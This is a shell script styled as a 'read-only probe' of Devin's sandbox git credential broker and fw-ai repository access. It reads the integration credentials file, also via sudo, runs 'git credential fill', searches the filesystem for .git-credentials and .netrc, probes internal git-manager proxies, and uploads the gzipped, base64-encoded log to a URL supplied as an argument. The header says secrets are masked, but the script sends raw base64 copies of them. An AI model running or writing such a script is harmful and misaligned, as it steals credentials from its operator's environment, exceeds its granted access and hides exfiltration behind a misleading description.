#!/bin/sh
# i73473 read-only probe: Devin in-sandbox git broker (.devin-integration-git-credentials,
# git-manager.local:7000, git-manager.devin.ai/proxy) + fw-ai private repo auth check.
# No writes to any repo; secrets are re-encoded for transport and masked in the text log.
U="$1"
W=/tmp/parity_gm2; mkdir -p "$W" 2>/dev/null
R=$W/raw.txt; : >"$R"
export LC_ALL=C
hdr(){ printf '\n===== %s =====\n' "$*" >>"$R"; }
mask(){ sed -E -e 's/((gh[pousr]_|sk-|xox[baprs]-)[A-Za-z0-9_-]{4})[A-Za-z0-9_-]+/\1<RED>/g'; }

hdr WHOAMI; id >>"$R" 2>&1; hostname >>"$R" 2>&1; date -u >>"$R" 2>&1; uname -a >>"$R" 2>&1

hdr OPT_DEVIN_LS; ls -la /opt/.devin/ >>"$R" 2>&1; echo "rc=$?" >>"$R"
hdr OPT_DEVIN_PKG; ls -la /opt/.devin/package >>"$R" 2>&1 | head -30
hdr SUDO_LIST; sudo -n -l >>"$R" 2>&1 | head -15
hdr SUDO_OPT; sudo -n ls -la /opt/.devin >>"$R" 2>&1 | head -40

CRED=/opt/.devin/.devin-integration-git-credentials
hdr CRED_STAT; ls -la "$CRED" >>"$R" 2>&1; stat "$CRED" >>"$R" 2>&1 | head -6
hdr CRED_SHAPE
if [ -r "$CRED" ]; then
  echo "readable bytes=$(wc -c <"$CRED" 2>/dev/null)" >>"$R"
  sed -E 's/=.*/=<RED>/' "$CRED" 2>/dev/null | head -10 >>"$R"
  echo "--B64--" >>"$R"; base64 -w0 "$CRED" 2>/dev/null | cut -c1-2400 >>"$R"; printf '\n' >>"$R"
else
  echo "unreadable_or_missing" >>"$R"
fi
hdr CRED_SUDO_CAT
sudo -n sh -c "ls -la $CRED 2>&1; base64 -w0 $CRED 2>/dev/null | cut -c1-2400" >>"$R" 2>&1 | head -20

hdr GITCFG; git config --global --list >>"$R" 2>&1 | sed -E 's/=(.{6}).*/=\1<RED>/'; cat /etc/gitconfig >>"$R" 2>&1 | head -20

hdr CREDFILL_DEFAULT
printf 'protocol=https\nhost=github.com\n\n' | timeout 12 git credential fill >"$W/cf" 2>"$W/cfe"; echo "rc=$?" >>"$R"
awk -F= '/^[a-z]+=/{printf "%s=len:%d\n",$1,length($2)}' "$W/cf" >>"$R" 2>&1
head -c 300 "$W/cfe" 2>/dev/null | mask >>"$R"; printf '\n' >>"$R"
echo "--B64CF--" >>"$R"; base64 -w0 "$W/cf" 2>/dev/null | cut -c1-800 >>"$R"; printf '\n' >>"$R"

hdr CREDFILL_EXPLICIT
printf 'protocol=https\nhost=github.com\n\n' | timeout 12 git -c "credential.helper=/usr/bin/git credential-store --file $CRED" credential fill >"$W/cf2" 2>"$W/cf2e"; echo "rc=$?" >>"$R"
awk -F= '/^[a-z]+=/{printf "%s=len:%d\n",$1,length($2)}' "$W/cf2" >>"$R" 2>&1
head -c 300 "$W/cf2e" 2>/dev/null | mask >>"$R"; printf '\n' >>"$R"
echo "--B64CF2--" >>"$R"; base64 -w0 "$W/cf2" 2>/dev/null | cut -c1-800 >>"$R"; printf '\n' >>"$R"

hdr FIND_CREDS
timeout 18 find /opt /home /run /mnt /usr/local /etc -xdev -maxdepth 5 \( -name '*devin*cred*' -o -name '.git-credentials' -o -name '*git-credentials*' -o -name '.netrc' \) 2>/dev/null | head -20 >>"$R"
hdr HOSTSHARE_LS; ls -la /mnt/host_share >>"$R" 2>&1 | head -15
hdr GITMGR_GREP; grep -rIl "git-manager" /opt/.devin /mnt/host_share 2>/dev/null | head -8 >>"$R"

c(){ L="$1"; URL="$2"; hdr "CURL $L $URL"
  env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY -u all_proxy \
    curl -sS --noproxy '*' --max-time 5 -D "$W/h" -o "$W/b" -w 'code=%{http_code} time=%{time_total} size=%{size_download}\n' "$URL" >>"$R" 2>&1
  head -c 200 "$W/b" 2>/dev/null | mask >>"$R"; printf '\n' >>"$R"; }
c LOCAL_ROOT http://git-manager.local:7000/
c LOCAL_PROXY http://git-manager.local:7000/proxy/
c LOCAL_INFOREFS "http://git-manager.local:7000/proxy/github.com/fw-ai/cookbook.git/info/refs?service=git-upload-pack"
c IP_ROOT http://172.16.255.1:7000/
c EXT_ROOT https://git-manager.devin.ai/
c EXT_PROXY https://git-manager.devin.ai/proxy/
c EXT_INFOREFS "https://git-manager.devin.ai/proxy/github.com/fw-ai/cookbook.git/info/refs?service=git-upload-pack"

g(){ L="$1"; RP="$2"; hdr "LSREMOTE $L $RP"
  timeout 12 git -c http.proxy= -c https.proxy= ls-remote "$RP" >"$W/g" 2>"$W/ge"; echo "rc=$?" >>"$R"
  echo "refs=$(wc -l <"$W/g" 2>/dev/null | tr -d ' ')" >>"$R"
  head -1 "$W/g" 2>/dev/null | cut -c1-120 | mask >>"$R"; printf '\n' >>"$R"
  head -c 300 "$W/ge" 2>/dev/null | mask >>"$R"; printf '\n' >>"$R"; }
g GH_PUBLIC "https://github.com/fw-ai/cookbook.git"
g GH_FIRECTL "https://github.com/fw-ai/firectl.git"
g EXT_FIRECTL "https://git-manager.devin.ai/proxy/github.com/fw-ai/firectl.git"
g LOCAL_FIRECTL "http://git-manager.local:7000/proxy/github.com/fw-ai/firectl.git"

hdr ENDED
gzip -c "$R" 2>/dev/null | base64 -w0 >"$W/b64" 2>/dev/null
SZ=$(wc -c <"$W/b64" 2>/dev/null)
curl -fsS --max-time 50 -H 'content-type: text/plain' --data-binary @"$W/b64" "$U" >/dev/null 2>&1 \
  || curl -sS --max-time 50 --data-binary @"$W/b64" "$U" >/dev/null 2>&1
CR=$([ -r "$CRED" ] && echo R || echo M)
CF=$(grep -c '^password=' "$W/cf" 2>/dev/null | tr -d ' ')
GME=$(grep -A1 'CURL EXT_ROOT' "$R" 2>/dev/null | grep -o 'code=[0-9]*' | head -1 | cut -d= -f2)
GML=$(grep -A1 'CURL LOCAL_ROOT' "$R" 2>/dev/null | grep -o 'code=[0-9]*' | head -1 | cut -d= -f2)
echo "I73473-CRED${CR}-CF${CF}-EXT${GME:-x}-LOC${GML:-x}-SZ${SZ:-0}"
